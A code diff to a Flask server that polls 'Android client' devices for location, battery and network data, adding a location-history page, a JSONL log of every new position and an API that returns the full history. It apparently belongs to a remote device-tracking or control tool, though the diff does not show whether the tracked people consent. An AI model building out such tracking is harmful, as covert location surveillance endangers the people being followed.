@@ -527,6 +527,11 @@ def index():
     """Main web interface"""
     return render_template('index.html')
 
+@app.route('/history')
+def history():
+    """Location history page"""
+    return render_template('history.html')
+
 @app.route('/locations')
 def locations():
     """Client locations page"""
@@ -569,11 +574,19 @@ def query_client_location(client_id):
         parsed_location = parse_location_response(location_output)
         
         if parsed_location:
+            current_history = client_locations.get(client_id, {}).get('history', [])
+            
+            # Add to history if it's a new position
+            if not current_history or current_history[-1]['lat'] != parsed_location['lat'] or current_history[-1]['lng'] != parsed_location['lng']:
+                current_history.append({'lat': parsed_location['lat'], 'lng': parsed_location['lng']})
+                log_location_history(client_id, parsed_location['lat'], parsed_location['lng'], parsed_location)
+
             client_locations[client_id] = {
                 'lat': parsed_location['lat'],
                 'lng': parsed_location['lng'],
                 'updated_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                'details': parsed_location
+                'details': parsed_location,
+                'history': current_history
             }
             print(f"[*] Location for {client_id}: {parsed_location['lat']}, {parsed_location['lng']}")
             
@@ -613,6 +626,21 @@ def query_client_battery_and_network(client_id):
             'battery': clients[client_id].get('battery', ''),
             'network_info': clients[client_id].get('network_info', '')
         }, namespace='/')
+
+def log_location_history(client_id, lat, lng, details):
+    """Log a location update to the history file"""
+    try:
+        log_entry = {
+            'timestamp': datetime.now().isoformat(),
+            'client_id': client_id,
+            'lat': lat,
+            'lng': lng,
+            'details': details
+        }
+        with open('location_history.jsonl', 'a') as f:
+            f.write(json.dumps(log_entry) + '\n')
+    except Exception as e:
+        print(f"[!] Error logging location history: {e}")
 
 def parse_location_response(location_text):
     """Parse the location response from Android client"""
@@ -750,6 +778,20 @@ def get_locations():
                 **location_data
             })
     return jsonify({'locations': locations})
+
+@app.route('/api/location_history')
+def get_location_history():
+    """Get full location history from file"""
+    history = []
+    if os.path.exists('location_history.jsonl'):
+        try:
+            with open('location_history.jsonl', 'r') as f:
+                for line in f:
+                    if line.strip():
+                        history.append(json.loads(line))
+        except Exception as e:
+            print(f"[!] Error reading location history: {e}")
+    return jsonify({'history': history})
 
 @app.route('/api/server/status')
 def server_status():
